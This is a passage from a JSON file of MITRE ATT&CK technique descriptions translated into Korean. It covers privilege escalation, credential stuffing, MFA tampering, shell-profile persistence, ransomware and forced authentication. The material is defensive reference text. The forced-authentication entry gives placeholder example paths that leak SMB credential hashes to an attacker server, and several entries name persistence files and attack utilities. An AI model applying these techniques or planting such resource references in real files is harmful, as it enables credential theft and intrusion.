    "description": "적대자들은 권한 상승을 시도하기 위해 소프트웨어 취약점을 악용할 수 있습니다. 소프트웨어 취약점의 악용은 적대자가 프로그램, 서비스 또는 운영 체제 소프트웨어 또는 커널 자체의 프로그래밍 오류를 이용하여 적대자가 제어하는 코드를 실행할 때 발생합니다. 권한 수준과 같은 보안 구성은 종종 정보 접근 및 특정 기술의 사용을 방해하므로, 적대자는 이러한 제한을 우회하기 위해 소프트웨어 악용을 포함한 권한 상승을 수행해야 할 가능성이 높습니다.\n\n시스템에 처음 접근할 때, 적대자는 낮은 권한의 프로세스에서 작동하고 있을 수 있으며, 이는 그들이 시스템의 특정 리소스에 접근하는 것을 방해합니다. 취약점은 일반적으로 높은 권한에서 실행되는 운영 체제 구성 요소 및 소프트웨어에 존재할 수 있으며, 이를 악용하여 시스템에서 더 높은 수준의 접근을 얻을 수 있습니다. 이는 누군가가 권한이 없는 사용자 수준 권한에서 SYSTEM 또는 루트 권한으로 이동할 수 있게 할 수 있습니다. 또한, 이는 적대자가 가상 머신이나 컨테이너와 같은 가상화된 환경에서 기본 호스트로 이동할 수 있게 할 수 있습니다. 이는 적절하게 구성되어 있고 다른 권한 상승 방법을 제한하는 엔드포인트 시스템을 침해하는 적대자에게 필요한 단계일 수 있습니다.\n\n적대자는 서명된 취약한 드라이버를 손상된 컴퓨터에 가져와 취약점을 악용하여 커널 모드에서 코드를 실행할 수 있습니다. 이 과정은 때때로 '자신의 취약한 드라이버를 가져오기'(BYOVD)라고 합니다. 적대자는 초기 접근 중 전달된 파일과 함께 취약한 드라이버를 포함하거나 손상된 시스템에 다운로드할 수 있습니다.",
    "external_id": "T1068",
    "modified": "2023-04-07T17:13:54.168Z",
    "translated": true
  },
  {
    "title": "Resource Forking",
    "description": "적대적 행위자는 리소스 포크를 악성 코드나 실행 파일을 숨기는 데 악용하여 탐지를 피해 보안 애플리케이션을 우회할 수 있습니다. 리소스 포크는 썸네일 이미지, 메뉴 정의, 아이콘, 대화 상자 및 코드를 저장하는 구조화된 방법을 제공합니다. 리소스 포크의 사용은 파일의 확장 속성을 표시할 때 식별할 수 있으며, 특정 명령어를 사용하여 확인할 수 있습니다. 리소스 포크는 더 이상 사용되지 않으며 애플리케이션 번들 구조로 대체되었습니다. 비지역화된 리소스는 애플리케이션 번들의 최상위 디렉터리에 배치되고, 지역화된 리소스는 특정 폴더에 배치됩니다.\n\n적대적 행위자는 리소스 포크를 사용하여 악성 데이터를 숨길 수 있으며, 이 데이터는 일반적으로 파일에 직접 저장될 수 있습니다. 적대적 행위자는 첨부된 리소스 포크와 함께 콘텐츠를 실행할 수 있으며, 이는 실행 가능한 위치로 이동된 후 호출됩니다. 리소스 포크의 콘텐츠는 실행 시까지 난독화되거나 암호화될 수도 있습니다.",
    "external_id": "T1564.009",
    "modified": "2022-05-05T05:10:23.890Z",
    "translated": true
  },
  {
    "title": "Account Access Removal",
    "description": "적대 세력은 합법적인 사용자가 사용하는 계정에 대한 접근을 방해하여 시스템 및 네트워크 자원의 가용성을 중단할 수 있습니다. 계정은 삭제되거나 잠기거나 변경되어 접근을 제거할 수 있습니다. 또한 적대 세력은 악의적인 변경 사항을 적용하기 위해 이후에 로그오프하거나 시스템을 종료/재부팅할 수도 있습니다.\n\nWindows에서는 Net 유틸리티, Set-LocalUser 및 Set-ADAccountPassword PowerShell 명령을 적대 세력이 사용하여 사용자 계정을 수정할 수 있습니다. Linux에서는 passwd 유틸리티를 사용하여 비밀번호를 변경할 수 있습니다. 계정은 그룹 정책에 의해 비활성화될 수도 있습니다.\n\n랜섬웨어 또는 유사한 공격을 사용하는 적대 세력은 일반적으로 이와 다른 영향 행동을 먼저 수행하여 사건 대응/복구를 방해한 후 데이터를 암호화하여 영향 목적을 완수할 수 있습니다.",
    "external_id": "T1531",
    "modified": "2024-10-15T15:35:13.577Z",
    "translated": true
  },
  {
    "title": "Credential Stuffing",
    "description": "위협자는 관계 없는 계정의 데이터 유출에서 얻은 자격 증명을 사용하여 자격 증명이 겹치는 대상을 통해 목표 계정에 접근할 수 있습니다. 때때로, 대량의 사용자 이름과 비밀번호 쌍이 온라인에 유출되는 경우가 있으며, 이는 웹사이트나 서비스가 해킹되었을 때 사용자 계정 자격 증명이 접근되는 경우입니다. 이러한 정보는 개인 및 비즈니스 계정에서 동일한 비밀번호를 사용하는 경향을 이용해 계정을 공격하려는 위협자에게 유용할 수 있습니다.\n\n자격 증명 채우기는 많은 인증 실패 및 계정 잠금을 초래할 수 있는 위험한 옵션입니다. 이는 조직의 로그인 실패 정책에 따라 달라집니다.\n\n일반적으로 자격 증명 채우기에 가장 많이 사용되는 서비스는 일반적으로 사용되는 포트를 통해 관리 서비스입니다. 일반적으로 타겟이 되는 서비스는 다음과 같습니다:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP 및 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / 터미널 서비스 (3389/TCP)\n* HTTP/HTTP 관리 서비스 (80/TCP 및 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\n관리 서비스 외에도, 위협자는 \"연합 인증 프로토콜을 활용하는 싱글 사인온(SSO) 및 클라우드 기반 애플리케이션\"과 외부에서 접근 가능한 이메일 애플리케이션, 예를 들어 Office 365를 타겟으로 할 수 있습니다.",
    "external_id": "T1110.004",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Obfuscated Files or Information",
    "description": "적대자는 실행 파일이나 파일을 시스템이나 전송 중에 내용을 암호화, 인코딩 또는 기타 방법으로 혼란시켜 발견하거나 분석하기 어렵게 만들려고 시도할 수 있습니다. 이는 다양한 플랫폼과 네트워크에서 방어를 피하기 위해 사용할 수 있는 일반적인 행동입니다.\n\n페이로드는 탐지를 피하기 위해 압축, 아카이브 또는 암호화될 수 있습니다. 이러한 페이로드는 초기 접근 시나 탐지를 완화하기 위해 나중에 사용될 수 있습니다. 때때로 사용자의 행동이 필요할 수 있으며, 사용자는 적대자가 제공한 비밀번호로 보호된 압축/암호화된 파일을 열기 위해 비밀번호를 입력해야 할 수도 있습니다. 적대자는 또한 JavaScript와 같은 압축되거나 아카이브된 스크립트를 사용할 수 있습니다.\n\n파일의 일부는 평문 문자열을 숨기기 위해 인코딩되어 방어자가 발견하는 데 도움이 되는 정보를 숨길 수 있습니다. 페이로드는 또한 별도의 생김새가 해로운 것으로 보이지 않는 파일로 나누어져, 다시 조합될 때만 악의적인 기능을 드러낼 수 있습니다.\n\n적대자는 또한 페이로드에서 실행되는 명령을 숨기기 위해 명령 혼란을 악용할 수 있으며, 명령 및 스크립팅 인터프리터를 통해 직접 실행할 수 있습니다. 환경 변수, 별칭, 문자 및 기타 플랫폼/언어 특정 의미 체계를 사용하여 서명 기반 탐지 및 애플리케이션 제어 메커니즘을 회피할 수 있습니다.",
    "external_id": "T1027",
    "modified": "2024-04-16T12:27:18.945Z",
    "translated": true
  },
  {
    "title": "Multi-Factor Authentication",
    "description": "적대 세력은 다단계 인증(MFA) 메커니즘을 비활성화하거나 수정하여 손상된 계정에 대한 지속적인 접근을 가능하게 만들 수 있습니다.\n\n적대 세력이 MFA가 없는 계정에 접근하거나 MFA 우회 방법을 사용하여 네트워크에 접근한 후, 이들은 자신의 접근 권한을 활용하여 MFA 방어를 수정하거나 완전히 비활성화할 수 있습니다. 이는 사용자를 Azure AD 조건부 액세스 정책에서 제외하거나, 새로운 취약한/적대 세력이 통제하는 MFA 방법을 등록하거나, 기대되는 기능을 우회하기 위해 MFA 프로그램 및 구성 파일을 수동으로 패치하는 등 정당한 기능을 남용함으로써 이루어질 수 있습니다.\n\n예를 들어, Windows 호스트 파일을 수정하여 MFA 호출을 MFA 서버가 아닌 로컬호스트로 리디렉션하면 MFA 프로세스가 실패할 수 있습니다. \"열림 실패\" 정책이 적용되어 있는 경우, 그렇지 않은 성공적인 인증 시도는 MFA를 강제하지 않고도 접근을 허용할 수 있습니다.\n\n적대 세력의 범위, 목표 및 권한에 따라 MFA 방어는 개별 계정 또는 피해자의 네트워크 환경 내의 모든 도메인 계정을 포함하는 더 큰 그룹의 모든 계정에 대해 비활성화될 수 있습니다.",
    "external_id": "T1556.006",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Remote Email Collection",
    "description": "적대 세력은 민감한 정보를 수집하기 위해 Exchange 서버, Office 365 또는 Google Workspace를 표적으로 삼을 수 있습니다. 적대 세력은 사용자의 자격 증명을 활용하고 Exchange 서버와 직접 상호작용하여 네트워크 내의 정보를 획득할 수 있습니다. 또한 적대 세력은 외부에 노출된 Exchange 서비스, Office 365 또는 Google Workspace에 접근하여 자격 증명이나 액세스 토큰을 사용해 이메일에 접근할 수 있습니다. 특정 키워드를 자동으로 검색하기 위해 도구를 사용할 수 있습니다.",
    "external_id": "T1114.002",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "IIS Components",
    "description": "적대자는 지속성을 확립하기 위해 인터넷 정보 서비스(IIS) 웹 서버에서 실행되는 악성 구성 요소를 설치할 수 있습니다. IIS는 웹 서버의 기능을 확장할 수 있는 여러 메커니즘을 제공합니다. 예를 들어, 인터넷 서버 응용 프로그래밍 인터페이스(ISAPI) 확장 및 필터를 설치하여 들어오고 나가는 IIS 웹 요청을 검사하고/또는 수정할 수 있습니다. 확장 및 필터는 세 가지 함수를 내보내는 DLL 파일로 배포됩니다: Get{Extension/Filter}Version, Http{Extension/Filter}Proc 및 (선택적으로) Terminate{Extension/Filter}. IIS 모듈 또한 IIS 웹 서버를 확장하기 위해 설치될 수 있습니다.\n\n적대자는 악성 ISAPI 확장 및 필터를 설치하여 트래픽을 관찰하고/또는 수정하거나, 손상된 기기에서 명령을 실행하거나, 명령 및 제어 트래픽을 프록시할 수 있습니다. ISAPI 확장 및 필터는 모든 IIS 웹 요청 및 응답에 접근할 수 있습니다. 예를 들어, 적대자는 이러한 메커니즘을 악용하여 HTTP 응답을 수정하여 이전에 손상된 호스트에 악성 명령/내용을 배포할 수 있습니다.\n\n적대자는 또한 트래픽을 관찰하고/또는 수정하기 위해 악성 IIS 모듈을 설치할 수 있습니다. IIS 7.0은 ISAPI 확장 및 필터와 동일한 제한 없는 HTTP 요청 및 응답 접근을 제공하는 모듈을 도입했습니다. IIS 모듈은 RegisterModule을 내보내는 DLL로 작성되거나, IIS HTTP 요청에 접근하기 위해 ASP.NET API와 인터페이스하는 .NET 응용 프로그램으로 작성될 수 있습니다.",
    "external_id": "T1505.004",
    "modified": "2021-10-17T15:06:24.161Z",
    "translated": true
  },
  {
    "title": "Invalid Code Signature",
    "description": "적대자들은 사용자가나 분석가, 도구를 속일 가능성을 높이기 위해 유효한 코드 서명의 특징을 모방하려고 시도할 수 있습니다. 코드 서명은 개발자로부터 이진 파일의 진정성을 제공하며, 이진 파일이 변조되지 않았음을 보장합니다. 적대자들은 서명된 프로그램에서 메타데이터와 서명 정보를 복사한 다음, 이를 서명되지 않은 프로그램의 템플릿으로 사용할 수 있습니다. 유효하지 않은 코드 서명을 가진 파일은 디지털 서명 검증 체크에서 실패하지만, 사용자에게는 더 합법적으로 보일 수 있으며 보안 도구가 이러한 파일을 부적절하게 처리할 수 있습니다. \n\n이 활동은 유효한 서명을 생성하지 않습니다.",
    "external_id": "T1036.001",
    "modified": "2020-02-10T19:52:47.724Z",
    "translated": true
  },
  {
    "title": "Run Virtual Instance",
    "description": "상대방은 탐지를 피하기 위해 가상 인스턴스를 사용하여 악의적인 작업을 수행할 수 있습니다. 컴퓨터 또는 컴퓨팅 환경을 에뮬레이션할 수 있는 다양한 가상화 기술이 존재합니다. 악성 코드를 가상 인스턴스 내에서 실행함으로써, 상대방은 보안 도구가 가상 인스턴스 내의 활동을 모니터링할 수 없기 때문에 그들의 행동과 관련된 흔적을 숨길 수 있습니다. 또한, 가상 네트워킹 구현(예: 브리지를 통한 어댑터)에 따라, 가상 인스턴스에서 생성된 네트워크 트래픽이 손상된 호스트로 다시 추적하기 어려울 수 있으며, IP 주소와 호스트 이름이 알려진 값과 일치하지 않을 수 있습니다.\n\n상대방은 가상화에 대한 기본 지원(예: Hyper-V)을 활용하거나 가상 인스턴스를 실행하는 데 필요한 파일(예: VirtualBox 바이너리)을 배포할 수 있습니다. 가상 인스턴스를 실행한 후, 상대방은 게스트와 호스트 간에 공유 폴더를 생성하여 가상 인스턴스가 호스트 파일 시스템과 상호작용할 수 있는 권한을 부여할 수 있습니다.",
    "external_id": "T1564.006",
    "modified": "2021-10-14T22:21:59.708Z",
    "translated": true
  },
  {
    "title": "Password Policy Discovery",
    "description": "적대자는 기업 네트워크 또는 클라우드 환경에서 사용되는 비밀번호 정책에 대한 자세한 정보를 접근하려고 할 수 있습니다. 비밀번호 정책은 추측하거나 해킹하기 어려운 복잡한 비밀번호를 강제하기 위한 방법입니다. 이 정보는 적대자가 일반적인 비밀번호 목록을 작성하고 정책에 맞는 사전 또는 무차별 대입 공격을 시작하는 데 도움이 될 수 있습니다.\n\n비밀번호 정책은 Windows, Linux, macOS 시스템에서 다양한 명령 셸 유틸리티를 통해 설정하고 발견할 수 있습니다. 적대자는 또한 네트워크 장치에서 비밀번호 정책 정보를 발견하기 위해 네트워크 장치 CLI를 활용할 수 있습니다.\n\n클라우드 환경에서도 AWS와 같은 API를 사용하여 비밀번호 정책을 발견할 수 있습니다.",
    "external_id": "T1201",
    "modified": "2024-10-15T16:02:44.477Z",
    "translated": true
  },
  {
    "title": "Event Triggered Execution",
    "description": "적대 세력은 특정 이벤트에 따라 실행이 트리거되는 시스템 메커니즘을 사용하여 지속성을 설정하거나 권한을 상승시킬 수 있습니다. 다양한 운영 체제는 로그온 또는 특정 애플리케이션/바이너리 실행과 같은 사용자 활동을 모니터링하고 구독하는 수단을 가지고 있습니다. 클라우드 환경 또한 특정 클라우드 이벤트에 응답하여 모니터링하고 호출할 수 있는 여러 기능과 서비스를 지원할 수 있습니다.\n\n적대 세력은 이러한 메커니즘을 남용하여 피해자에게 지속적인 접근을 유지하기 위해 악성 코드를 반복적으로 실행할 수 있습니다. 피해자 시스템에 접근한 후, 적대 세력은 이벤트 트리거를 생성하거나 수정하여 이벤트 트리거가 호출될 때 실행될 악성 콘텐츠를 가리키도록 할 수 있습니다.\n\n실행은 SYSTEM 또는 서비스 계정과 같은 높은 권한을 가진 계정에 의해 프록시될 수 있으므로, 적대 세력은 이러한 트리거된 실행 메커니즘을 남용하여 자신의 권한을 상승시킬 수 있습니다.",
    "external_id": "T1546",
    "modified": "2024-10-15T15:57:00.731Z",
    "translated": true
  },
  {
    "title": "Unix Shell Configuration Modification",
    "description": "적대자는 사용자의 쉘에서 트리거되는 악성 명령을 실행함으로써 지속성을 설정할 수 있습니다. 사용자 쉘은 세션 전반에 걸쳐 이벤트에 따라 여러 구성 스크립트를 실행합니다. 예를 들어, 사용자가 명령 줄 인터페이스를 열거나 원격으로 로그인할 때 로그인 셸이 시작됩니다. 로그인 셸은 시스템의 스크립트와 사용자의 홈 디렉토리에서 환경을 구성하기 위해 스크립트를 실행합니다. 모든 시스템의 로그인 셸은 시작될 때 /etc/profile을 사용합니다. 이러한 구성 스크립트는 그 디렉토리의 권한 수준에서 실행되며, 종종 환경 변수를 설정하거나 별칭을 만들고 사용자의 환경을 사용자 지정하는 데 사용됩니다. 셸이 종료되거나 종료될 때, 셸이 적절히 종료되도록 추가 셸 스크립트가 실행됩니다.\n\n적대자는 셸에서 자동으로 실행되는 스크립트에 명령을 삽입함으로써 지속성을 설정하려고 시도할 수 있습니다. 예를 들어, 대부분의 GNU/Linux 시스템의 기본 셸인 bash를 사용하여 적대자는 /etc/profile 및 /etc/profile.d 파일에 악성 바이너리를 실행하는 명령을 추가할 수 있습니다. 이러한 파일은 수정하려면 일반적으로 루트 권한이 필요하며, 시스템의 어떤 셸이 실행될 때마다 실행됩니다. 사용자 수준 권한에서는 적대자가 ~/.bash_profile, ~/.bash_login 또는 ~/.profile에 악성 명령을 삽입할 수 있으며, 이는 사용자가 명령 줄 인터페이스를 열거나 원격으로 연결할 때 소싱됩니다. 시스템은 나열된 순서에서 첫 번째로 존재하는 파일만 실행하므로 적대자들은 실행 보장을 위해 ~/.bash_profile을 사용해왔습니다. 또한 적대자들은 원격으로 연결되거나 추가 대화형 셸이 열릴 경우 추가로 실행되는 ~/.bashrc 파일을 이용해 왔습니다. 일부 악성 소프트웨어는 프로그램 종료를 트리거하는 경우도 있으며, 적대자는 세션 종료 시 ~/.bash_logout 파일을 사용하여 악성 명령을 실행할 수 있습니다.\n\nmacOS의 경우, 이 기술의 기능은 유사하지만 macOS 10.15 이상에 대한 기본 셸인 zsh를 활용할 수 있습니다. Terminal.app이 열리면 애플리케이션은 zsh 로그인 셸과 zsh 대화형 셸을 실행합니다. 로그인 셸은 /etc/profile, /etc/zshenv, /etc/zprofile 및 /etc/zlogin을 사용하여 시스템 환경을 구성합니다. 로그인 셸은 이후 사용자 환경을 ~/.zprofile 및 ~/.zlogin으로 구성합니다. 대화형 셸은 ~/.zshrc를 사용하여 사용자 환경을 구성합니다. 종료 시 /etc/zlogout 및 ~/.zlogout이 실행됩니다. 레거시 프로그램의 경우, macOS는 시작 시 /etc/bashrc를 실행합니다.",
    "external_id": "T1546.004",
    "modified": "2024-09-25T15:02:24.143Z",
    "translated": true
  },
  {
    "title": "Forced Authentication",
    "description": "적대자는 사용자가 인증 정보를 자동으로 제공하도록 유도하거나 강제로 하여 자격 증명 자료를 수집할 수 있습니다.\n\n서버 메시지 블록(SMB) 프로토콜은 Windows 네트워크에서 자원 접근 및 파일 공유를 위한 인증 및 시스템 간의 통신에 일반적으로 사용됩니다. Windows 시스템이 SMB 자원에 연결을 시도할 때, 현재 사용자에 대한 자격 증명 정보를 원격 시스템에 자동으로 인증하고 전송하려고 시도합니다. 이 행동은 사용자가 네트워크 자원에 접근하기 위해 자격 증명을 입력할 필요가 없도록 하는 기업 환경에서 일반적입니다.\n\n웹 배포 저작 및 버전 관리(WebDAV) 또한 SMB가 차단되거나 실패했을 때 Windows 시스템에서 일반적으로 백업 프로토콜로 사용됩니다. WebDAV는 HTTP의 확장이며, 일반적으로 TCP 포트 80 및 443을 통해 작동합니다.\n\n적대자는 이 행동을 이용하여 강제로 SMB/WebDAV 인증을 통해 사용자 계정 해시에 접근할 수 있습니다. 적대자는 스피어 피싱을 통해 사용자의 시스템에 적대자가 제어하는 외부 서버에 대한 자원 링크를 포함한 첨부 파일을 전송하거나, 권한이 있는 계정의 탐색 경로에 특별히 조작된 파일을 배치할 수 있습니다. 사용자의 시스템이 신뢰할 수 없는 자원에 접근할 때 인증을 시도하고 사용자의 해시된 자격 증명을 포함한 정보를 SMB를 통해 적대자가 제어하는 서버로 전송합니다. 자격 증명 해시에 접근할 수 있는 적대자는 오프라인에서 무차별 대입 공격을 수행하여 평문 자격 증명에 접근할 수 있습니다.\n\n이러한 일이 발생할 수 있는 여러 가지 방법이 있습니다. 실제 사례로서 다음과 같은 구체적인 사항이 포함됩니다:\n\n* 문서를 포함한 스피어 피싱 첨부 파일이 문서 열기 시 자동으로 로드되는 자원을 포함하고 있습니다. 예를 들어, SMB 요청을 촉발시키기 위해 <code>file[:]//[원격 주소]/Normal.dotm</code>과 유사한 요청이 포함될 수 있습니다.\n* 아이콘 파일 이름이 <code>\\\\[원격 주소]\\pic.png</code>와 같은 외부 참조를 가리키도록 수정된 .LNK 또는 .SCF 파일이 있습니다. 이 파일은 아이콘이 렌더링될 때 시스템이 자원을 로드하도록 강제하여 자격 증명을 반복적으로 수집하게 합니다.",
    "external_id": "T1187",
    "modified": "2024-10-15T16:33:34.508Z",
    "translated": true
  },
  {
    "title": "SID-History Injection",
    "description": "적대자는 SID-History 주입을 사용하여 권한을 상승시키고 접근 제어를 우회할 수 있습니다. Windows 보안 식별자(SID)는 사용자 또는 그룹 계정을 식별하는 고유한 값입니다. SID는 보안 설명자와 접근 토큰 모두에서 Windows 보안에 의해 사용됩니다. 계정은 SID-History Active Directory 속성에 추가 SID를 보유할 수 있으며, 이를 통해 도메인 간의 상호 운용 가능한 계정 마이그레이션이 가능합니다. (예: SID-History의 모든 값이 접근 토큰에 포함됨)\n\n도메인 관리자(또는 동등한 권한) 권한을 가진 경우, 수집된 또는 잘 알려진 SID 값을 SID-History에 삽입하여 기업 관리자와 같은 임의의 사용자/그룹의 가장을 가능하게 할 수 있습니다. 이 조작은 로컬 리소스에 대한 권한 상승이나 측면 이동 기법을 통해 접근할 수 없는 도메인에 대한 접근을 초래할 수 있습니다.",
    "external_id": "T1134.005",
    "modified": "2021-02-09T15:49:58.414Z",
    "translated": true
  },
  {
    "title": "Network Boundary Bridging",
    "description": "적대자는 경계 네트워크 장치나 네트워크 세분화를 담당하는 내부 장치를 손상시켜 네트워크 경계를 넘을 수 있습니다. 이러한 장치를 침해하면 적대자가 신뢰된 네트워크와 신뢰되지 않은 네트워크를 분리하는 트래픽 라우팅에 대한 제한을 우회할 수 있습니다.\n\n라우터와 방화벽과 같은 장치는 신뢰된 네트워크와 신뢰되지 않은 네트워크 간의 경계를 설정하는 데 사용될 수 있습니다. 이들은 조직의 정책을 시행하기 위해 트래픽 유형을 제한하여 이러한 연결에서 내재된 위험을 줄이고자 합니다. 트래픽 제한은 IP 주소, 레이어 4 프로토콜 포트 금지 또는 애플리케이션을 식별하기 위한 깊은 패킷 검사 등을 통해 이루어질 수 있습니다. 나머지 네트워크와 상호 작용하기 위해 이러한 장치는 직접 주소가 지정 가능하거나 투명하게 운영될 수 있지만, 그러한 장치가 손상되었을 때 적대자가 이를 어떻게 우회하는지와는 무관합니다.\n\n적대자가 이러한 경계 장치를 제어하게 되면, 정책 시행을 우회하여 두 개의 분리된 네트워크 간의 신뢰 경계를 넘어 일반적으로 금지된 트래픽을 통과시킬 수 있습니다. 장치에서 충분한 권한을 얻음으로써, 적대자는 원하는 트래픽을 허용하도록 장치를 재구성할 수 있으며, 이를 통해 다중 홉 프록시를 통한 명령 및 제어 또는 트래픽 복제를 통한 데이터 유출과 같은 목표를 달성할 수 있습니다. 적대자는 또한 네트워크 세분화를 담당하는 내부 장치를 표적으로 삼아 내부 프록시와 함께 이러한 목표를 달성할 수 있습니다. 경계 장치가 두 개의 별도 조직을 분리하는 경우, 적대자는 새로운 피해 환경으로의 수평 이동도 촉진할 수 있습니다.",
    "external_id": "T1599",
    "modified": "2022-05-05T05:05:44.200Z",
    "translated": true
  },
  {
    "title": "Data Encrypted for Impact",
    "description": "적대자는 타겟 시스템이나 네트워크의 많은 시스템에서 데이터를 암호화하여 시스템 및 네트워크 자원의 가용성을 방해할 수 있습니다. 그들은 파일이나 로컬 및 원격 드라이브의 데이터를 암호화하고 복호화 키에 대한 접근을 차단함으로써 저장된 데이터를 접근 불가능하게 만들려고 할 수 있습니다. 이는 피해자로부터 복호화 또는 복호화 키에 대한 금전적 보상을 요구하기 위해(랜섬웨어) 또는 키가 저장되거나 전송되지 않는 경우 데이터를 영구적으로 접근 불가능하게 만들기 위해 수행될 수 있습니다.\n\n랜섬웨어의 경우, 일반적인 사용자 파일인 오피스 문서, PDF, 이미지, 비디오, 오디오, 텍스트 및 소스 코드 파일이 암호화되는 것이 일반적입니다(그리고 종종 이름이 바뀌거나 특정 파일 마커가 태그가 붙습니다). 적대자는 이러한 파일을 잠금 해제하고 조작하기 위해 [파일 및 디렉토리 권한 수정]이나 [시스템 종료/재부팅]과 같은 다른 행동을 먼저 수행해야 할 수도 있습니다. 경우에 따라 적대자는 중요한 시스템 파일, 디스크 파티션 및 MBR을 암호화할 수 있습니다.\n\n타겟 조직에 미치는 영향을 극대화하기 위해, 데이터를 암호화하기 위해 설계된 악성코드는 네트워크를 통해 전파되기 위해 다른 공격 기술인 [유효 계정], [운영체제 자격 증명 덤프] 및 [SMB/Windows 관리 공유]를 활용하는 웜과 같은 기능을 가질 수 있습니다. 또한 암호화 악성코드는 [내부 변조]를 활용하여 피해자의 바탕화면을 변경하거나 피해자에게 랜섬 노트 또는 다른 메시지를 연결된 프린터로 보내는 방식으로 위협할 수 있습니다(이를 \"프린트 폭탄\"이라고 함).\n\n클라우드 환경에서는 손상된 계정 내의 저장 객체도 암호화될 수 있습니다.",
    "external_id": "T1486",
    "modified": "2022-06-16T13:07:10.318Z",
    "translated": true
  },
  {
    "title": "Subvert Trust Controls",
    "description": "적대 세력은 안전 경고 기능이 있는 사용자에게 신뢰할 수 없는 활동을 경고하거나 신뢰할 수 없는 프로그램의 실행을 방지하는 보안 통제를 무효화할 수 있습니다. 운영 체제와 보안 제품은 프로그램이나 웹사이트가 일정 수준의 신뢰를 가진 것으로 식별하는 메커니즘을 포함할 수 있습니다. 이러한 기능의 예로는 유효한 코드 서명 인증서로 서명된 프로그램이 실행될 수 있도록 허용되거나, 인터넷에서 다운로드된 것으로 설정된 속성으로 인해 사용자에게 경고 메시지를 표시하는 프로그램, 신뢰할 수 없는 사이트에 연결하려고 할 때 알림을 받는 경우가 있습니다.\n\n적대 세력은 이러한 신뢰 메커니즘을 무력화하려고 시도할 수 있습니다. 적대 세력이 사용하는 방법은 그들이 무력화하고자 하는 특정 메커니즘에 따라 다릅니다. 적대 세력은 이러한 통제를 무력화하기 위해 파일 및 디렉토리 권한 수정 또는 레지스트리 수정과 같은 작업을 수행할 수 있습니다. 또한, 적대 세력은 신뢰를 획득하기 위해 코드 서명 인증서를 생성하거나 도용할 수도 있습니다.",
    "external_id": "T1553",
    "modified": "2024-03-01T17:17:37.292Z",
    "translated": true
  },
  {
    "title": "Elevated Execution with Prompt",
    "description": "적대자는 사용자의 자격 증명을 요청하여 권한을 상승시키기 위해 `AuthorizationExecuteWithPrivileges` API를 활용할 수 있습니다. 이 API의 목적은 애플리케이션 개발자에게 애플리케이션 설치나 업데이트와 같은 작업을 루트 권한으로 간편하게 수행할 수 있는 방법을 제공하는 것입니다. 이 API는 루트 권한을 요청하는 프로그램이 신뢰할 수 있는 출처에서 온 것인지 또는 악의적으로 수정된 것인지 확인하지 않습니다.\n\n비록 이 API는 더 이상 권장되지 않지만, 최신 macOS 버전에서도 여전히 완전히 기능합니다. 이 API를 호출할 때 사용자는 자격 증명을 입력하라는 메시지를 받지만, 프로그램의 출처나 무결성에 대한 검사는 이루어지지 않습니다. API를 호출하는 프로그램은 또한 다른 사용자가 쓸 수 있는 파일을 로드할 수 있으며, 이러한 파일은 수정되어 상승된 권한으로 악의적 행동을 수행할 수 있습니다.\n\n적대자는 `AuthorizationExecuteWithPrivileges`를 악용하여 루트 권한을 얻어 피해자에게 악성 소프트웨어를 설치하고 지속적 메커니즘을 설치할 수 있습니다. 이 기법은 사용자가 악성 코드에 상승된 권한을 부여하도록 속이기 위해 변장 기법과 결합될 수 있습니다. 이 기법은 이 API를 사용하는 기계에 존재하는 합법적인 프로그램을 수정하여도 효과가 있음을 보여주었습니다.",
    "external_id": "T1548.004",
    "modified": "2022-10-19T16:35:18.492Z",
    "translated": true
  },
  {
    "title": "Firmware",
    "description": "적대자들은 목표 설정에 사용할 수 있는 피해자의 호스트 펌웨어에 대한 정보를 수집할 수 있습니다. 호스트 펌웨어에 대한 정보는 특정 호스트의 유형 및 버전과 같은 다양한 세부정보를 포함할 수 있으며, 이는 환경 내 호스트에 대한 추가 정보를 추론하는 데 사용될 수 있습니다.\n\n적대자들은 이러한 정보를 다양한 방법으로 수집할 수 있으며, 정보 요청을 통한 직접적인 유도 방식으로도 수행될 수 있습니다. 호스트 펌웨어에 대한 정보는 종종 온라인 또는 다른 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수 있습니다. 이러한 정보 수집은 다른 형태의 정찰 활동 기회를 드러내거나, 운영 자원을 구축하거나, 초기 액세스를 확보하는 데 연결될 수 있습니다.",
    "external_id": "T1592.003",
    "modified": "2021-04-15T03:22:46.759Z",
    "translated": true
  },
  {
    "title": "Encrypted Channel",
    "description": "적대자는 커맨드 및 제어 트래픽을 숨기기 위해 통신 프로토콜이 제공하는 고유한 보호 기능에 의존하기보다는 암호화 알고리즘을 사용할 수 있습니다. 보안 알고리즘을 사용하더라도 이러한 구현은 비밀 키가 악성 코드 샘플이나 구성 파일 내에서 인코딩되거나 생성되는 경우 역설계에 취약할 수 있습니다.",
    "external_id": "T1573",
    "modified": "2024-04-16T12:29:47.903Z",
    "translated": true
  },
  {
    "title": "Authentication Package",
    "description": "적대자는 시스템 부팅 시 DLL을 실행하기 위해 인증 패키지를 악용할 수 있습니다. Windows 인증 패키지 DLL은 시스템 시작 시 로컬 보안 권한(LSA) 프로세스에 의해 로드됩니다. 이들은 운영 체제에 여러 로그인 프로세스와 여러 보안 프로토콜을 지원합니다.\n\n적대자는 LSA 인증 패키지가 제공하는 자동 시작 메커니즘을 지속성 위해 사용할 수 있으며, Windows 레지스트리 위치에 이진 파일에 대한 참조를 넣음으로써 이를 수행할 수 있습니다. 이 경우, 키 값은 \"Authentication Packages\"이며, 비타겟 바이너리를 지정합니다. 이후 인증 패키지가 로드될 때 시스템에 의해 이 이진 파일이 실행됩니다.",
    "external_id": "T1547.002",
    "modified": "2022-04-20T16:29:36.291Z",
    "translated": true
  },
  {
    "title": "Regsvr32",
